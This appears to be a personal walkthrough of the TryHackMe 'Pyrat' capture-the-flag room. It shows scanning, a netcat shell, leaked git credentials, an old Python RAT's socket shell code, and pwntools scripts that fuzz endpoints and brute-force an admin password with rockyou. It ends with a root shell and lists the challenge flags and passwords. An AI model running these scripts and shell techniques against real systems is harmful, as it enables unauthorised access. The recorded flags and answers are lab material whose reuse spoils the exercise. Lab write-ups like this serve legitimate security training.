
[[TryHackMe]] Room

**Date**: 11/02/25
**Target IP**: 10.10.123.43 , 10.10.154.174

---
## **Initial Scanning**

### **[[nmap]] :**

- 22/tcp   open  ssh      syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

- 8000/tcp open  http-alt syn-ack ttl 64 SimpleHTTP/0.6 Python/3.11.2

---
## **Exploration**

Navigating to Port 8000 displays "Try a more basic connection". This apparently is a sign to use nc.

```
❯ sudo nc 10.10.123.43 8000
```

This gives me a shell as www-data.

Running linpeas.sh shows 2 users - root and think. Found a path to mail as /var/mail/think.

```
$ cat /var/mail/think

From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```

---
## **Exploitation**

The root user has mentioned GitHub. Checking /opt/dev we find a `.git` folder :

```
www-data@Pyrat:/opt/dev/.git$ ls
ls
branches	config	     HEAD   index  logs     refs
COMMIT_EDITMSG	description  hooks  info   objects

www-data@Pyrat:/opt/dev/.git$ cat config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
    	name = Jose Mario
    	email = josemlwdf@github.com

[credential]
    	helper = cache --timeout=3600

[credential "https://github.com"]
    	username = think
    	password = _TH1NKINGPirate$_

```

Using this password we can SSH as the think user and obtain the user flag :

```
think@Pyrat:~$ cat user.txt
996bdb1f619a68361417cabca5454705
```

---
## **Post-Exploitation**

Since the git repo is here we can run `git status` to check for changes.

```
think@Pyrat:/opt/dev$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	deleted:    pyrat.py.old

no changes added to commit (use "git add" and/or "git commit -a")
think@Pyrat:/opt/dev$ git restore pyrat.py.old
```

We can then read the old script : 

```
think@Pyrat:/opt/dev$ cat pyrat.py.old 
...............................................

def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e
```

---
## **Escalation**

The prompt for the room hints that we need to find a secret endpoint.

As the connection to the room drops if too many requests are sent, is better to just write my own simple fuzzer :

```python
from pwn import *

context.log_level = 'error'  # Suppress non-error logs

# host = "pyrat.thm"

host = "10.10.154.174"

port = 8000

endpoints_file = "./common-endpoints.txt"

def connect():
    return remote(host=host, port=port)

def attempt(endpoint):
    conn = connect()
    
    conn.sendline(endpoint.encode())
    
    resp = conn.recvline(timeout=2)
    
    if b"name '" + endpoint.encode() + b"' is not defined\n" in resp:
        conn.close()    
        print(f"{endpoint} : Nah : {resp}")
    else:
        conn.close()
        print(f"-----------------------------------------------------------")
        print(f"[+] {endpoint} : ENDPOINT VALID RAHHHHH : {resp}")
        print(f"-----------------------------------------------------------")

def fuzz():
    endpoints = open(endpoints_file, 'r')
    for endpoint in endpoints:
        endpoint = endpoint.strip()
        if endpoint.startswith('#') or not endpoint:
            continue
        else:
            attempt(endpoint)

if __name__ == "__main__" :
    fuzz()
```

Found the following interesting endpoints :

```
-----------------------------------------------------------
[+] admin : ENDPOINT VALID RAHHHHH : b'Password:\n'
-----------------------------------------------------------
-----------------------------------------------------------
[+] shell : ENDPOINT VALID RAHHHHH : b''
-----------------------------------------------------------
```

Have to figure out a way to brute-force the admin endpoint password.

The following script did the trick :

```python
from pwn import *

context.log_level = 'error' # Suppress non-error logs

host = "pyrat.thm"

port = 8000

password_file = "/usr/share/wordlists/rockyou.txt"

endpoint = "admin"

def connect():
    return remote(host=host, port=port)

def attempt(pwd):
    conn = connect()
    conn.sendline(endpoint.encode())
    resp = conn.recvline(timeout=2)
    print(resp)

    conn.sendline(pwd.encode())

    result = conn.recvline(timeout=2)

    if result == b'Password:\n':
        print(f"{pwd} : Incorrect Password!")
        conn.close()

    else:
        print(f"{pwd} : {result}")
        conn.close()

def brute_force():
    wordlist = open(password_file, 'r')
    for pwd in wordlist:
        pwd = pwd.strip()
        if pwd.startswith('#') or not pwd:
            continue
        else:
            attempt(pwd)

if __name__ == "__main__" :
    brute_force()
```

We obtain the following :

```shell
b'Password:\n'
abc123 : b'Welcome Admin!!! Type "shell" to begin\n'
```

On logging in, I got a root shell and was able to obtain the root flag:

```shell
❯ nc pyrat.thm 8000
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell

# whoami
whoami
root

# cat root.txt
cat root.txt
ba5ed03e9e74bb98054438480165e221
```

---
## **Summary**

- think user SSH password : \_TH1NKINGPirate$_
- User Flag : 996bdb1f619a68361417cabca5454705
- admin endpoint password : abc123
- Root Flag : ba5ed03e9e74bb98054438480165e221